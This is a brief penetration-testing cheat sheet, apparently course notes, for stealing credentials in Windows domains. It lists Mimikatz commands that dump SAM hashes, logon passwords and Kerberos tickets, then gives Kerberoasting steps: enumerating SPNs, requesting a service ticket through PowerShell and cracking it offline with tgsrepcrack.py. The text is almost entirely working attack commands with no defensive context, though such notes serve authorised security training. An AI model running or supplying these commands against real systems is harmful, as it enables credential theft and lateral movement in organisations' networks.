Mimikatz

```
mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonpasswords
sekurlsa::tickets
sekurlsa::tickets /export

kerberos::ask /target:<SPN> MSSQLSvc/xor-app23.xor.com:1433
standard::base64
kerberos::list /export

```
Get a list of SPNs:

```
/usr/share/kerberoast/GetUserSPNs.ps1
```


From PowerShell, we can use the KerberosRequestorSecurityToken class655 to request the service ticket

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/xor-app23.xor.com:1433"

klist
```
crack password

```
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000- Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

```